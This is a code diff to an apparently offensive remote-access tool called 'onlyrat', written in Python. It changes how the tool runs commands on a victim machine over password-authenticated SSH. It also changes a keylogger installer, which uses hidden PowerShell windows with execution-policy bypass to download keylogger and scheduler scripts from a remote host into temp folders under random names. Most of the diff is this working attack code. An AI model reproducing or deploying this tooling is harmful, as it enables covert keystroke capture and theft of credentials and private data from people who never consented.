@@ -104,20 +104,22 @@ def remote_download(ipv4,pword,path_to_file,local_download_location):
     os.system(f"sshpass -p \"{pword}\" scp onlyrat@{ipv4}:{path_to_file} {local_download_location}")
 
 def remote_command(ipv4,pword,command):
-    os.system(f"sshpass -p \"{pword}\" ssh onlyrat@{ipv4} '{command}'")
+    c = f"sshpass -p \'{pword}\' ssh onlyrat@{ipv4} '{command}'"
+    print(c)
+    os.system(c)
 
 def keylogger(ipv4,pword,temp_path,startup_path):
     print("[+] Initializing keylogger....")
-    keylogger_command = f"powershell powershell.exe -ep bypass -w hidden -c \"iwr -uri {remote_path}/keylogger/keylogger.ps1 -outfile '{temp_path}/XukhovfGQPLEcYwZ.ps1'\""
-    scheduler_command = f"powershell powershell.exe -ep bypass -w hidden -c \"iwr -uri {remote_path}/keylogger/scheduler.ps1 -outfile '{temp_path}/QbaHnRAlojyG.ps1'\""
-    controller_command = f"powershell powershell.exe -ep bypass -w hidden -c \"iwr -uri {remote_path}/keylogger/controller.cmd -outfile '{startup_path}/WPNtcsvEaf.cmd'\""
+    keylogger_command = f"powershell.exe -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger/keylogger.ps1 -outfile {temp_path}/XukhovfGQPLEcYwZ.ps1\""
+    scheduler_command = f"powershell.exe -ep bypass -windowstyle hidden -c \"iwr -uri {remote_path}/keylogger/scheduler.ps1 -outfile {temp_path}/QbaHnRAlojyG.ps1\""
     print("[+] keylogger prepared. Ready to download....")
     print("[+] Initializing keylogger.....")
+    # print(keylogger_command,'\n\n',scheduler_command,'\n\n',controller_command,'\n\n')
     remote_command(ipv4,pword,keylogger_command)
     print("[+] Initializing scheduler.....")
     remote_command(ipv4,pword,scheduler_command)
-    print("[+] Initializing  controller.....")
-    remote_command(ipv4,pword,controller_command)
+    #print("[+] Initializing  controller.....")
+    #remote_command(ipv4,pword,controller_command)
     print("[*] keylogger installed successfully")
 
 def update():
@@ -154,7 +156,7 @@ def cli(arguments):
                     clear()
                     print(banner)
                     print(options_menu)
-                elif option in ["quit", "exit"]:
+                elif option in ["quit", "exit", "e", "q"]:
                     exit()
                 else:
                     os.system(option)
@@ -165,6 +167,8 @@ def cli(arguments):
             update()
         elif argument in ["-r","--remove","--uninstall"]:
             remove()
+        else:
+            print("[*] Can't interpret command")
     else:
         print(help_menu)
 
